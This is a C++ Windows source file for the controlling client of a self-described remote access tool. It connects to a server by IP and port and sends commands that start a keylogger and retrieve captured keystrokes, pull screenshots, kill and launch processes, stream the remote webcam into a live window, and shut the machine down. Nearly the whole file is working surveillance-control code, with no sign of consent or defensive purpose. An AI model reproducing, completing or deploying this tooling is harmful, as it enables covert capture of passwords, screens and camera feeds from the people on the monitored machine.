#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <iomanip>
#include <thread>
#include <chrono>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace std;
using namespace Gdiplus;

// Global Socket
SOCKET clientSocket;

// Global streaming control
atomic<bool> isStreaming(false);
HWND streamWindow = NULL;

// Network Helper Functions
void sendLine(const string& s) {
    string msg = s + "\n";
    send(clientSocket, msg.c_str(), msg.length(), 0);
}

string receiveLine() {
    string result;
    char c;
    while (recv(clientSocket, &c, 1, 0) > 0) {
        if (c == '\n') break;
        if (c != '\r') result += c;
    }
    return result;
}

// Menu Functions
void displayMainMenu() {
    cout << "\n========== REMOTE ACCESS TOOL ==========\n";
    cout << "1. Keylogger\n";
    cout << "2. Screenshot\n";
    cout << "3. Process Management\n";
    cout << "4. Application Management\n";
    cout << "5. Webcam Streaming\n";
    cout << "6. Shutdown Server\n";
    cout << "0. Exit\n";
    cout << "========================================\n";
    cout << "Choose option: ";
}

// Keylogger Functions
void keyloggerMenu() {
    string choice;
    bool running = true;
    
    sendLine("KEYLOG");
    
    while (running) {
        cout << "\n----- KEYLOGGER -----\n";
        cout << "1. Start Keylogger\n";
        cout << "2. Stop Keylogger\n";
        cout << "3. Print Keys\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("HOOK");
            cout << "Keylogger started on server.\n";
        } else if (choice == "2") {
            sendLine("UNHOOK");
            cout << "Keylogger stopped on server.\n";
        } else if (choice == "3") {
            sendLine("PRINT");
            char buffer[4096];
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                cout << "\n----- CAPTURED KEYS -----\n";
                cout << buffer << endl;
                cout << "-------------------------\n";
            }
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}

// Screenshot Function
void screenshotMenu() {
    string choice;
    bool running = true;
    
    sendLine("TAKEPIC");
    
    while (running) {
        cout << "\n----- SCREENSHOT -----\n";
        cout << "1. Take Screenshot\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("TAKE");
            
            string sizeStr = receiveLine();
            unsigned long size = stoul(sizeStr);
            
            cout << "Receiving screenshot (" << size << " bytes)...\n";
            
            char* buffer = new char[size];
            unsigned long totalReceived = 0;
            
            while (totalReceived < size) {
                int bytesReceived = recv(clientSocket, buffer + totalReceived, size - totalReceived, 0);
                if (bytesReceived > 0) {
                    totalReceived += bytesReceived;
                }
            }
            
            string filename = "screenshot.png";
            ofstream file(filename, ios::binary);
            file.write(buffer, size);
            file.close();
            
            delete[] buffer;
            
            cout << "Screenshot saved as: " << filename << endl;
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}
int receiveCountSafe() {
    string countStr = receiveLine();
    try {
        return stoi(countStr);
    } catch (...) {
        cout << "[debug] invalid count received: '" << countStr << "'\n";
        // thử đọc thêm 1 dòng nếu server có gửi header thừa
        countStr = receiveLine();
        cout << "[debug] retry count received: '" << countStr << "'\n";
        try {
            return stoi(countStr);
        } catch (...) {
            cout << "[debug] still invalid. returning 0.\n";
            return 0;
        }
    }
}

// Process Management
void processMenu() {
    string choice;
    bool running = true;
    
    sendLine("PROCESS");
    
    while (running) {
        cout << "\n----- PROCESS MANAGEMENT -----\n";
        cout << "1. View Processes\n";
        cout << "2. Kill Process\n";
        cout << "3. Start Process\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("XEM");
            
            // string countStr = receiveLine();
            // int count = stoi(countStr);
            int count = receiveCountSafe();
            
            cout << "\n----- PROCESS LIST -----\n";
            cout << left << setw(40) << "Name" << setw(10) << "PID" << setw(10) << "Threads" << endl;
            cout << string(60, '-') << endl;
            
            for (int i = 0; i < count; i++) {
                string name = receiveLine();
                string pid = receiveLine();
                string threads = receiveLine();
                
                cout << left << setw(40) << name << setw(10) << pid << setw(10) << threads << endl;
            }
            cout << "------------------------\n";
            
        } else if (choice == "2") {
            sendLine("KILL");
            cout << "Enter Process ID to kill: ";
            string pid;
            getline(cin, pid);
            
            sendLine("KILLID");
            sendLine(pid);
            
            string response = receiveLine();
            cout << response << endl;
            
            sendLine("QUIT");
            
        } else if (choice == "3") {
            sendLine("START");
            cout << "Enter process name (without .exe): ";
            string name;
            getline(cin, name);
            
            sendLine("STARTID");
            sendLine(name);
            
            string response = receiveLine();
            cout << response << endl;
            
            sendLine("QUIT");
            
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}

// Application Management
void applicationMenu() {
    string choice;
    bool running = true;
    
    sendLine("APPLICATION");
    
    while (running) {
        cout << "\n----- APPLICATION MANAGEMENT -----\n";
        cout << "1. View Applications\n";
        cout << "2. Kill Application\n";
        cout << "3. Start Application\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            sendLine("XEM");
            
            // string countStr = receiveLine();
            // int count = stoi(countStr);
            int count = receiveCountSafe();
            
            cout << "\n----- APPLICATION LIST -----\n";
            cout << left << setw(40) << "Name" << setw(10) << "PID" << setw(10) << "Threads" << endl;
            cout << string(60, '-') << endl;
            
            for (int i = 0; i < count; i++) {
                string status = receiveLine();
                string name = receiveLine();
                string pid = receiveLine();
                string threads = receiveLine();
                
                cout << left << setw(40) << name << setw(10) << pid << setw(10) << threads << endl;
            }
            cout << "----------------------------\n";
            
        } else if (choice == "2") {
            sendLine("KILL");
            cout << "Enter Application PID to kill: ";
            string pid;
            getline(cin, pid);
            
            sendLine("KILLID");
            sendLine(pid);
            
            string response = receiveLine();
            cout << response << endl;
            
            sendLine("QUIT");
            
        } else if (choice == "3") {
            sendLine("START");
            cout << "Enter application name (without .exe): ";
            string name;
            getline(cin, name);
            
            sendLine("STARTID");
            sendLine(name);
            
            string response = receiveLine();
            cout << response << endl;
            
            sendLine("QUIT");
            
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
}

// Window Procedure for streaming window
LRESULT CALLBACK StreamWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CLOSE:
            isStreaming = false;
            DestroyWindow(hwnd);
            return 0;
        case WM_DESTROY:
            streamWindow = NULL;
            return 0;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
}

// Register window class for streaming
void RegisterStreamWindowClass() {
    static bool registered = false;
    if (registered) return;
    
    WNDCLASSA wc = {};
    wc.lpfnWndProc = StreamWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "WebcamStreamClass";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    
    RegisterClassA(&wc);
    registered = true;
}

// Display streaming window with frames

void displayStreamingWindow() {
    if (!isStreaming) return;

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    RegisterStreamWindowClass();

    streamWindow = CreateWindowA(
        "WebcamStreamClass",
        "Webcam Stream",
        WS_OVERLAPPEDWINDOW | WS_VISIBLE,
        100, 100, 800, 600,
        NULL, NULL, GetModuleHandle(NULL), NULL
    );
    if (!streamWindow) {
        cout << "Failed to create streaming window!" << endl;
        GdiplusShutdown(gdiplusToken);
        isStreaming = false;
        return;
    }
    ShowWindow(streamWindow, SW_SHOW);
    UpdateWindow(streamWindow);

    // Optimize socket settings for streaming (based on TestRTSP)
    char opt = 1;
    setsockopt(clientSocket, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    int recvBuff = 512 * 1024; // 512KB receive buffer
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVBUF, (char*)&recvBuff, sizeof(recvBuff));
    DWORD timeout = 2000; // 2 giây
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    vector<char> buffer;
    int frameCount = 0;
    auto startTime = chrono::high_resolution_clock::now();

    cout << "\n[Streaming] Window opened. Press 2 to stop streaming.\n";

    while (isStreaming) {
        MSG msg;
        // Vẫn phải giữ cái này để ứng dụng không bị treo
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        if (!isStreaming || !streamWindow) break;

        // CƠ CHẾ TỰ ĐỘNG ĐỒNG BỘ (RESYNC)
        int magic = 0;
        int n = recv(clientSocket, (char*)&magic, sizeof(magic), MSG_PEEK); // Chỉ nhìn, chưa lấy ra
        
        if (n > 0) {
            if (magic != 0xFFFFFFFF) {
                // Nếu không phải Header -> Đây là rác -> Bỏ qua 1 byte rồi thử lại
                char trash;
                recv(clientSocket, &trash, 1, 0); 
                continue; // Quay lại đầu vòng lặp
            }
            
            // Nếu đúng là Header -> Lấy nó ra khỏi buffer
            recv(clientSocket, (char*)&magic, sizeof(magic), 0);
        } else {
             // Socket lỗi hoặc chưa có dữ liệu
             if (n == 0 || WSAGetLastError() != WSAEWOULDBLOCK) {
                 isStreaming = false; 
                 break;
             }
             continue;
        }

        // Receive frame size (binary DWORD, not ASCII)
        DWORD frameSize = 0;
        n = recv(clientSocket, (char*)&frameSize, sizeof(frameSize), MSG_WAITALL);
        if (n <= 0) {
            // Connection closed or error
            isStreaming = false;
            break;
        }

        // Validate frame size
        if (frameSize < 1024 || frameSize > 2 * 1024 * 1024) {
            // Invalid frame size, skip
            continue;
        }

        // Resize buffer if needed
        if (buffer.size() < frameSize) {
            buffer.resize(frameSize);
        }

        // Receive frame data
        int totalReceived = 0;
        while (totalReceived < (int)frameSize && isStreaming) {
            n = recv(clientSocket, buffer.data() + totalReceived, frameSize - totalReceived, 0);
            if (n <= 0) {
                isStreaming = false;
                break;
            }
            totalReceived += n;
        }
        if (!isStreaming || totalReceived != (int)frameSize) break;

        // Decode JPEG from memory using GDI+
        IStream* pStream = NULL;
        if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
            // Write data to stream
            ULONG bytesWritten;
            pStream->Write(buffer.data(), frameSize, &bytesWritten);
            
            // Reset stream position to beginning
            LARGE_INTEGER li = {0};
            pStream->Seek(li, STREAM_SEEK_SET, NULL);

            // Load and draw image
            Gdiplus::Image* newImage = new Gdiplus::Image(pStream);
            
            if (newImage && newImage->GetLastStatus() == Gdiplus::Ok) {
                // Draw image to window
                HDC hdc = GetDC(streamWindow);
                if (hdc) {
                    Graphics graphics(hdc);
                    graphics.DrawImage(newImage, 0, 0, 640, 480);
                    ReleaseDC(streamWindow, hdc);
                }
                delete newImage;

                frameCount++;
                if (frameCount % 30 == 0) {
                    auto currentTime = chrono::high_resolution_clock::now();
                    auto ms = chrono::duration_cast<chrono::milliseconds>(currentTime - startTime).count();
                    double fps = (frameCount * 1000.0) / max(1LL, ms);
                    string title = "Webcam Stream - FPS: " + to_string((int)fps) +
                                   " | Frames: " + to_string(frameCount);
                    SetWindowTextA(streamWindow, title.c_str());
                }
            } else {
                if (newImage) delete newImage;
            }
            
            pStream->Release();
        }
    }
    cout << "\n[Streaming] Total frames received: " << frameCount << endl;

    if (streamWindow) {
        DestroyWindow(streamWindow);
        streamWindow = NULL;
    }

    GdiplusShutdown(gdiplusToken);
}


// Webcam Streaming
void webcamMenu() {
    string choice;
    bool running = true;
    
    sendLine("WEBCAM");
    
    while (running) {
        cout << "\n----- WEBCAM STREAMING -----\n";
        cout << "1. Start Streaming\n";
        cout << "2. Stop Streaming\n";
        cout << "0. Back to Main Menu\n";
        cout << "Choose: ";
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            if (isStreaming) {
                cout << "Streaming is already running!\n";
                continue;
            }
            
            sendLine("START");
            string response = receiveLine();
            
            if (response == "OK") {
                cout << "Streaming started!\n";
                isStreaming = true;
                
                // Start streaming in a separate thread
                thread streamThread(displayStreamingWindow);
                streamThread.detach();
                
                cout << "Streaming window will open shortly...\n";
                
            } else {
                cout << response << endl;
            }
            
        } else if (choice == "2") {
            if (!isStreaming) {
                cout << "No streaming is running!\n";
                continue;
            }
            
            isStreaming = false;
            sendLine("STOP");
            string response = receiveLine();
            cout << response << endl;
            
            // Wait a bit for window to close
            this_thread::sleep_for(chrono::milliseconds(500));
            
        } else if (choice == "0") {
            if (isStreaming) {
                cout << "Stopping streaming first...\n";
                isStreaming = false;
                sendLine("STOP");
                receiveLine();
                this_thread::sleep_for(chrono::milliseconds(500));
            }
            sendLine("QUIT");
            running = false;
        }
    }
}

// Main Function
int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        return 1;
    }
    
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return 1;
    }
    
    string serverIP;
    cout << "Enter server IP address (or 127.0.0.1 for localhost): ";
    getline(cin, serverIP);
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr);
    serverAddr.sin_port = htons(5656);
    
    cout << "Connecting to server...\n";
    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Connection failed. Is the server running?\n";
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "Connected to server successfully!\n";
    
    string choice;
    bool running = true;
    
    while (running) {
        displayMainMenu();
        cin >> choice;
        cin.ignore();
        
        if (choice == "1") {
            keyloggerMenu();
        } else if (choice == "2") {
            screenshotMenu();
        } else if (choice == "3") {
            processMenu();
        } else if (choice == "4") {
            applicationMenu();
        } else if (choice == "5") {
            webcamMenu();
        } else if (choice == "6") {
            sendLine("SHUTDOWN");
            cout << "Shutdown command sent to server.\n";
            running = false;
        } else if (choice == "0") {
            sendLine("QUIT");
            running = false;
        }
    }
    
    closesocket(clientSocket);
    WSACleanup();
    
    cout << "Disconnected from server.\n";
    return 0;
}
